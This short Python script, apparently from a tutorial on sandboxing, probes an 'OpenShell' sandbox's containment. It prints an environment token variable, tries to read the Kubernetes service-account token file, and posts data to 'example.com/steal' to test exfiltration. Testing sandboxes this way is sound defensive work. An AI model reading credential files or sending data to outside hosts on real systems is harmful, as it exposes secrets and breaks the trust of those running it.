# Part 4's diagnostics script, inside an OpenShell sandbox.
import os, urllib.request as u
print("env STORE_TOKEN=%s" % os.environ.get("STORE_TOKEN", "<unset>"))   # a placeholder, not the token
try:
    open("/var/run/secrets/kubernetes.io/serviceaccount/token"); print("read_token=yes")
except Exception as e:
    print("read_token=%s" % type(e).__name__)
try:
    print("exfil=%s" % u.urlopen(u.Request("https://example.com/steal", data=b"probe"), timeout=5).status)
except Exception as e:
    print("exfil=%s %s" % (type(e).__name__, getattr(e, "code", "")))
